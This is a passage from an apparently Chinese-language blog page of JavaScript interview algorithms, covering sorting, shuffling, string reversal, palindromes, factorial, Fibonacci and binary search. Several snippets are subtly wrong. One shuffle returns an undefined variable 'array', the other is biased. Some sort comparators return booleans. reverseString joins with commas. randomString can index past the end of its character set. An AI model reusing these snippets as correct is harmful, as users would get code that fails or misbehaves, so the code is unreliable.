class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> len = arr.length;</span><br><span class="line">  <span class="keyword">var</span> preIndex, current;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">    preIndex = i - <span class="number">1</span>;</span><br><span class="line">    current = arr[i];</span><br><span class="line">    <span class="keyword">while</span>(preIndex &gt;= <span class="number">0</span> &amp;&amp; arr[preIndex] &gt; current) &#123;</span><br><span class="line">      arr[preIndex+<span class="number">1</span>] = arr[preIndex];</span><br><span class="line">      preIndex--;</span><br><span class="line">    &#125;</span><br><span class="line">    arr[preIndex+<span class="number">1</span>] = current;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="二路归并排序"><a href="#二路归并排序" class="headerlink" title="二路归并排序"></a>二路归并排序</h2><p>将两个按值有序序列合并成一个按值有序序列<br><img src="../images/javascript/js_merge_sort.gif" title="二路归并排序原理图"><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [],</span><br><span class="line">      il = <span class="number">0</span>,</span><br><span class="line">      ir = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (il &lt; left.length &amp;&amp; ir &lt; right.length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (left[il] &lt; right[ir]) &#123;</span><br><span class="line">      result.push(left[il++]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.push(right[ir++]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(left[il])&#123;</span><br><span class="line">    result.push(left[il++]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(right[ir])&#123;</span><br><span class="line">    result.push(right[ir++]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> len = arr.length,</span><br><span class="line">      temp,</span><br><span class="line">      gap = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(gap &lt; len/<span class="number">3</span>) &#123;          <span class="comment">//动态定义间隔序列</span></span><br><span class="line">    gap =gap*<span class="number">3</span>+<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (gap; gap &gt; <span class="number">0</span>; gap = <span class="built_in">Math</span>.floor(gap/<span class="number">3</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = gap; i &lt; len; i++) &#123;</span><br><span class="line">      temp = arr[i];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> j = i-gap; j &gt;= <span class="number">0</span> &amp;&amp; arr[j] &gt; temp; j-=gap) &#123;</span><br><span class="line">        arr[j+gap] = arr[j];</span><br><span class="line">      &#125;</span><br><span class="line">      arr[j+gap] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他常见应用"><a href="#其他常见应用" class="headerlink" title="其他常见应用"></a>其他常见应用</h2><h3 id="数字、英文排序"><a href="#数字、英文排序" class="headerlink" title="数字、英文排序"></a>数字、英文排序</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 顺序：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortArr</span> (<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.sort();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortArr</span> (<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 倒序：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortArr</span> (<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &lt; b</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="中文姓名排序"><a href="#中文姓名排序" class="headerlink" title="中文姓名排序"></a>中文姓名排序</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 顺序</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortNameArr</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b.localeCompare(a, <span class="string">'zh-Hans-CN'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 倒序</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortNameArr</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.localeCompare(b, <span class="string">'zh-Hans-CN'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组乱序"><a href="#数组乱序" class="headerlink" title="数组乱序"></a>数组乱序</h1><h2 id="遍历法"><a href="#遍历法" class="headerlink" title="遍历法"></a>遍历法</h2><p>取随机位的值与当前的互换<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = arr.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (i + <span class="number">1</span>));</span><br><span class="line">    [arr[i], arr[j]] = [arr[j], arr[i]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><h2 id="sort法"><a href="#sort法" class="headerlink" title="sort法"></a>sort法</h2><p>随机数大于0.5的概率为1/2，然后选择顺序或倒序即可<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  arr.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> sign = (<span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span>) ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> (a - b) * sign;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="Number数组中最大差值"><a href="#Number数组中最大差值" class="headerlink" title="Number数组中最大差值"></a>Number数组中最大差值</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMaxProfit</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> min = arr[<span class="number">0</span>], max = arr[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &lt; min) &#123;</span><br><span class="line">      min = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &gt; max) &#123;</span><br><span class="line">      max = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max - min;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="打印九九乘法表"><a href="#打印九九乘法表" class="headerlink" title="打印九九乘法表"></a>打印九九乘法表</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">1</span>; n &lt;= <span class="number">9</span>; n++) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">1</span>; m &lt; n+<span class="number">1</span>; m++) &#123;</span><br><span class="line">    <span class="keyword">var</span> b = m * n;</span><br><span class="line">    <span class="built_in">document</span>.write(m + <span class="string">"×"</span> + n + <span class="string">"="</span> + b + <span class="string">" "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">"&lt;br/&gt;&lt;br/&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="求数组交集和差级"><a href="#求数组交集和差级" class="headerlink" title="求数组交集和差级"></a>求数组交集和差级</h1><p>ES7方法：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> intersection = a.filter(<span class="function"><span class="params">v</span> =&gt;</span> b.includes(v))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> difference = a.concat(b).filter(<span class="function"><span class="params">v</span> =&gt;</span> !a.includes(v) || !b.includes(v))</span><br></pre></td></tr></table></figure></p><h1 id="字符串翻转"><a href="#字符串翻转" class="headerlink" title="字符串翻转"></a>字符串翻转</h1><h2 id="转换成array"><a href="#转换成array" class="headerlink" title="转换成array"></a>转换成array</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverseString</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(<span class="string">''</span>).reverse().join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反向遍历"><a href="#反向遍历" class="headerlink" title="反向遍历"></a>反向遍历</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverseString</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = str.length - <span class="number">1</span>;i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    tmp += str[i];</span><br><span class="line">  <span class="keyword">return</span> tmp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="生成随机字符串"><a href="#生成随机字符串" class="headerlink" title="生成随机字符串"></a>生成随机字符串</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomString</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> str = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>;</span><br><span class="line">  <span class="keyword">var</span> tmp = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    tmp += str.charAt(<span class="built_in">Math</span>.round(<span class="built_in">Math</span>.random()*str.length));</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="判断回文"><a href="#判断回文" class="headerlink" title="判断回文"></a>判断回文</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 算法思想：每次判断第一个字符和最后一个字符是否相等，然后取第二个字符到倒数第二个字符之间的字符串递归</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">palindrome</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// \W匹配任何非单词字符，即去除非正常字符。等价于“[^A-Za-z0-9_]”。</span></span><br><span class="line">  <span class="keyword">var</span> re = <span class="regexp">/[\W_]/g</span>;</span><br><span class="line">  <span class="comment">// 将字符串变成小写字符,并干掉除字母数字外的字符</span></span><br><span class="line">  <span class="keyword">var</span> lowRegStr = str.toLowerCase().replace(re, <span class="string">''</span>);</span><br><span class="line">  <span class="comment">// 如果字符串lowRegStr的length长度为0时，字符串即是palindrome</span></span><br><span class="line">  <span class="keyword">if</span>(lowRegStr.length === <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">// 如果字符串的第一个和最后一个字符不相同，那么字符串就不是palindrome</span></span><br><span class="line">  <span class="keyword">if</span>(lowRegStr[<span class="number">0</span>] !== lowRegStr[lowRegStr.length - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">//递归</span></span><br><span class="line">  <span class="keyword">return</span> palindrome(lowRegStr.slice(<span class="number">1</span>, lowRegStr.length - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="统计出现最多的元素"><a href="#统计出现最多的元素" class="headerlink" title="统计出现最多的元素"></a>统计出现最多的元素</h1><p>最常见的思路是先使用object统计出元素和个数，再循环取最大的，但这样无疑会增加复杂度。所以需要在第一次遍历的时候就缓存好最大的元素。</p><h2 id="统计字符串中最多的字母和出现的次数"><a href="#统计字符串中最多的字母和出现的次数" class="headerlink" title="统计字符串中最多的字母和出现的次数"></a>统计字符串中最多的字母和出现的次数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 算法思想：先遍历，将出现的字符和次数以object的形式输出；再obj遍历，输出次数最多的字符</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMaxDuplicateChar</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(str.length == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> charObj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> maxElArr = [str.charAt(<span class="number">0</span>), <span class="number">0</span>];<span class="comment">//  次数最多的元素和次数，默认为第一个</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!charObj[str.charAt(i)]) &#123;</span><br><span class="line">      charObj[str.charAt(i)] = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      charObj[str.charAt(i)] += <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (charObj[str.charAt(i)] &gt;= maxElArr[<span class="number">1</span>]) &#123;</span><br><span class="line">        maxElArr = [str.charAt(i), charObj[str.charAt(i)]];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(charObj, maxElArr);</span><br><span class="line">  <span class="keyword">return</span> maxElArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="统计数组中出现最多次数的元素和次数"><a href="#统计数组中出现最多次数的元素和次数" class="headerlink" title="统计数组中出现最多次数的元素和次数"></a>统计数组中出现最多次数的元素和次数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMaxDuplicateArr</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(arr.length == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> maxElArr = [arr[<span class="number">0</span>], <span class="number">0</span>]; <span class="comment">//  次数最多的元素和次数，默认为第一个</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!obj[arr[i]]) &#123;</span><br><span class="line">      obj[arr[i]] = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      obj[arr[i]] += <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (obj[arr[i]] &gt;= maxElArr[<span class="number">1</span>]) &#123;</span><br><span class="line">        maxElArr = [arr[i], obj[arr[i]]];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(obj, maxElArr);</span><br><span class="line">  <span class="keyword">return</span> maxElArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h1><p>1x2x3x4x5…</p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorialize</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(num &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(num == <span class="number">0</span> || num == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> num * factorialize(num - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="非递归"><a href="#非递归" class="headerlink" title="非递归"></a>非递归</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorialize</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(num &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(num == <span class="number">0</span> || num == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(num &gt; <span class="number">1</span>)</span><br><span class="line">    result *= num--;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="生成斐波那契数列"><a href="#生成斐波那契数列" class="headerlink" title="生成斐波那契数列"></a>生成斐波那契数列</h1><p>斐波那契数列（黄金分割数列）: 0、1、1、2、3、5、8、13、21、34，考察递归</p><h2 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getfib</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> getfib(n - <span class="number">1</span>) + getfib(n - <span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibo</span>(<span class="params">len</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> fibo = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    fibo.push(getfib(i));</span><br><span class="line">  <span class="keyword">return</span> fibo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="非递归-1"><a href="#非递归-1" class="headerlink" title="非递归"></a>非递归</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFibonacci</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> fibarr = [];</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(i &lt; n) &#123;</span><br><span class="line">    <span class="keyword">if</span>(i &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">      fibarr.push(i);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fibarr.push(fibarr[i - <span class="number">1</span>] + fibarr[i - <span class="number">2</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fibarr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>查找某个值是否在有序数组中，数组必须是有序的</p><h2 id="递归-2"><a href="#递归-2" class="headerlink" title="递归"></a>递归</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binary_search2</span>(<span class="params">arr, low, high, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(low &gt; high)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">var</span> mid = <span class="built_in">parseInt</span>((low + high)/<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span>(key == arr[mid])</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(key &gt; arr[mid])</span><br><span class="line">    <span class="keyword">return</span> binary_search2(arr, mid+<span class="number">1</span>, high, key);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(key &lt; arr[mid])</span><br><span class="line">    <span class="keyword">return</span> binary_search2(arr, low, mid<span class="number">-1</span>, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="非递归-2"><a href="#非递归-2" class="headerlink" title="非递归"></a>非递归</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binary_search</span>(<span class="params">arr, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> low = <span class="number">0</span>,</span><br><span class="line">      high = arr.length - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(low &lt;= high)&#123;</span><br><span class="line">    <span class="keyword">var</span> mid = <span class="built_in">parseInt</span>((high + low) / <span class="number">2</span>);</span><br><span class="line">    